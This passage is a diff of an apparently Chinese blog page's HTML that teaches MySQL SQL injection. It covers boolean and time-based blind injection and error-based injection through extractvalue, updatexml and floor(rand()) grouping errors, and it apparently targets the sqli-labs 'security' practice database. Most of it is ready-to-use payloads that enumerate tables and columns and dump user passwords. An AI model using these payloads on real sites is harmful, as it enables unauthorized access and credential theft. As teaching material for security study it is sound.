+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and ascii(<span class="name">substr</span>((<span class="name">select</span> table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;11--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>判断表中<strong>字段</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and ascii(substr((select column_name from information_schema.columns where table_name &#x3D; &#39;security&#39; limit 1,1),1,1))&gt;10--+
-&#39;and ascii(substr((select username from security.users limit 0,1),1,1))&gt;10--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Pgsql"><div class="codebox"><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;and ascii(substr((select column_name from information_schema.columns where table_name = &#x27;</span><span class="keyword">security</span><span class="string">&#x27; limit 1,1),1,1))&gt;10--+</span></span><br><span class="line"><span class="string">&#x27;</span><span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">security</span>.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">10</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <h3><span id="时间盲注">时间盲注</span></h3><p>if、sleep</p>
 <p>一般配合py脚本注入。</p>
-<table>
+<div class="table-container"><table>
 <thead>
 <tr>
 <th>payload</th>
@@ -265,7 +120,7 @@
 <td>?id&#x3D;1’ and if (right(database(),2)&#x3D;’ty’,sleep(5),1)–+</td>
 <td>截取右边两个字符</td>
 </tr>
-</tbody></table>
+</tbody></table></div>
 <p>判断是否存在漏洞：’and sleep(5)–+</p>
 <h3><span id="报错注入">报错注入</span></h3><p>页面无法显示数据库的信息，但是源码中有mysql输出错误的函数把mysql的错误回显到前端，也就是有报错内容的。<br>报错注入形式上一般是做两个嵌套的查询，里面的那个查询被称为子查询，执行顺序也是从子查询开始的，所以我们可以通过子查询查询我们想要的数据，然后在通过报错函数将我们查询到的数据带出，从而达到爆出想要查询的数据。</p>
 <p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bc35f8dd4f7c">12种报错注入+万能语句 - 简书 (jianshu.com)</a></p>
@@ -274,21 +129,21 @@
 <p><code>EXTRACTVALUE(XML_document,XPath_string)</code>：从<code>XML_document</code>中返回所包含查询值的<code>XPath_string</code>。</p>
 <p>第二个参数<code>XPath_String</code>是报错的关键，XML文档中查找字符位置是用<code>/xxx/xxx/xxx</code>这种格式，如果我们写入非法格式的内容就会报错，并且返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</p>
 <p>paylaod：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">EXTRACTVALUE(&#39;anything&#39;,[查询语句])<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXTRACTVALUE(&#x27;anything&#x27;,[查询语句])</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>使用<code>concat()</code>能使查询语句输出的更加完整。</p>
 <p><code>extractvalue()</code>报错一次只能回显出32位的数据，如果想要回显超过32位的数据，需要使用<code>substr(), mid(), left(), right()</code>之类的截断函数去截断数据分次输出。</p>
 <p><strong>爆数据库名</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and extractvalue(1,concat(0x7e,(select database())))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> database())))--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>爆表名</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> group_concat(<span class="name">table_name</span>) from information_schema.tables where table_schema=database())))--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>爆列名</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> group_concat(<span class="name">column_name</span>) from information_schema.columns where table_name=&#x27;users&#x27;)))--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>爆数据</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and extractvalue(1,concat(0x7e,(select group_concat(password) from users)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> group_concat(<span class="name">password</span>) from users)))--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
@@ -298,16 +153,16 @@
 <p><code>updatexml()</code>的报错注入姿势和<code>extractvalue()</code>类似，也是第二个参数位置，输入非法字符，导致报错。</p>
 <p>updatexml()和extractvalue()相同一次只能输出<code>32</code>位数据，要完整的输出数据只能使用截断函数进行截断分多次输出。</p>
 <p><strong>爆数据库名</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and updatexml(1,concat(0x7e,(select database())),0x7e)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> database())),<span class="number">0</span>x7e)--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>爆表名</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema&#x3D;database())),0x7e)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> group_concat(<span class="name">table_name</span>)from information_schema.tables where table_schema=database())),<span class="number">0</span>x7e)--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>爆列名</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name&#x3D;&#39;users&#39;)),0x7e)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> group_concat(<span class="name">column_name</span>)from information_schema.columns where table_name=&#x27;users&#x27;)),<span class="number">0</span>x7e)--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>爆数据</strong>：</p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and updatexml(1,concat(0x7e,(select group_concat(password)from users)),0x7e)--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Lisp"><div class="codebox"><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="name">select</span> group_concat(<span class="name">password</span>)from users)),<span class="number">0</span>x7e)--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
@@ -316,8 +171,7 @@
 <p>这里需要先了解几个函数：<br>rand()随机函数，返回0~1之间的某个值<br>floor(a)取整函数，返回小于等于a,且值最接近a的一个整数<br>count()聚合函数也称作计数函数，返回查询对象的总数<br>group by x 分组语句，按照查询结果分组</p>
 </blockquote>
 <p>报错语句：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select count(*) from users group by concat(database(),floor(rand(0)*2));
-select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from users group by concat(database(),floor(rand(0)*2));</span><br><span class="line">select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>上面两句的含义是一模一样的，第二句只是把<code>concat(database(),floor(rand(0)*2))</code> 当做了<code>x</code>。</p>
 <ul>
@@ -326,25 +180,25 @@ select count(*),concat(database(),floor(rand(0)*2)) as x from users group by x;<
 <li><code>count(*)</code>：计数。</li>
 </ul>
 <p>对于语句：</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select count(*) from users group by (floor(rand(0)*2));<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from users group by (floor(rand(0)*2));</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p>小tips：<strong>在使用group by的时候，floor(rand(0)*2)会被执行一次，如果虚表不存在记录，插入虚表的时候floor(rand(0)*2)会再被执行一次</strong></p>
 <p>执行流程：<code>floor(rand(0)*2))</code>第一次计算是0，虚表没有，于是插入虚表，注意此时<code>floor(rand(0)*2))</code>又会计算一次(第二次计算)，结果为1，所以插入虚表的值是1；然后<code>floor(rand(0)*2))</code>第三次计算结果是1，虚表里有，于是<code>count</code>直接加1；<code>floor(rand(0)*2))</code>第四次计算是0，虚表没有，于是插入虚表，此时<code>floor(rand(0)*2))</code>会再次计算（第五次计算）然后插入虚表，此时结果是1，但是虚表里已经有1了，所以导致了主键重复报错。</p>
-<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">报错信息：ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;&lt;group_key&gt;&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Plaintext"><div class="codebox"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错信息：ERROR 1062 (23000): Duplicate entry &#x27;1&#x27; for key &#x27;&lt;group_key&gt;&#x27;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 
 
 <p><strong>爆数据库名：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and (select count(*) from users group by concat(database(),floor(rand(0)*2)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="N1ql"><div class="codebox"><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;and (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> users <span class="keyword">group</span> <span class="keyword">by</span> concat(<span class="keyword">database</span>(),<span class="built_in">floor</span>(rand(<span class="number">0</span>)*<span class="number">2</span>)))--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>爆表名：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and (select count(*) from users group by concat((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),floor(rand(0)*2)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<div class="code-container" code-lang="Q"><div class="codebox"><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;<span class="built_in">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*) <span class="keyword">from</span> users <span class="built_in">group</span> <span class="keyword">by</span> concat((<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">where</span> table_schema=database()),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>)))--+</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
 
 <p><strong>爆列名：</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">&#39;and (select count(*) from users group by concat((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;),floor(rand(0)*2)))--+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
